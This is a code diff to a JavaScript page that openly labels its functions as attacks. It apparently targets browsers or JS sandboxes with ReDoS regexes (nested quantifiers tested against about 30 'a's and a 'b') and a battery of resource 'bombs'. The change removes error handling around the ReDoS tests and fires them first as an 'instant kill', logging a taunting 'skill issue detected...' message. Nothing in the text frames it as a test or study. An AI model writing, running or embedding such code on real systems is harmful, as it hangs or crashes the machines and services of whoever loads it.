@@ -18,15 +18,12 @@ const safe=fn=>{try{fn()}catch(e){log('blocked: '+e.message)}};
 
 log('Attacks starting...');
 
-// Attack 1: ReDoS
+// Attack 1: ReDoS - multiple evil patterns
 function redosBomb(){
-  log('ReDoS...');
-  const patterns = [
-    [/^(a+)+$/, 'a'.repeat(26)+'b'],
-    [/^(a|aa)+$/, 'a'.repeat(26)+'b'],
-    [/^(a+)+$/, 'a'.repeat(28)+'b'],
-  ];
-  patterns.forEach(([re,str])=>{try{re.test(str)}catch(e){}});
+  log('skill issue detected...');
+  /^(a+)+$/.test('a'.repeat(30)+'b');
+  /^(a|aa)+$/.test('a'.repeat(30)+'b');
+  /^(a+)+$/.test('a'.repeat(32)+'b');
 }
 
 // Attack 2: Recursive JSON
@@ -166,24 +163,8 @@ function arrayBomb(){
   }
 }
 
-// ALL ATTACKS FIRE
-safe(canvasBomb);
-safe(arrayBomb);
-safe(stringBomb);
-safe(domDepthBomb);
-safe(iframeBomb);
-safe(cssVarBomb);
-safe(workerBomb);
-safe(historyBomb);
-safe(mutationBomb);
-safe(layoutBomb);
-safe(jsonBomb);
-
-// ReDoS - the kill shot (after other attacks load the system)
-setTimeout(()=>{
-  log('skill issue detected...');
-  /^(a+)+$/.test('a'.repeat(28)+'b');
-},500);
+// ReDoS FIRST - instant kill
+redosBomb();
 
 };
 </script>
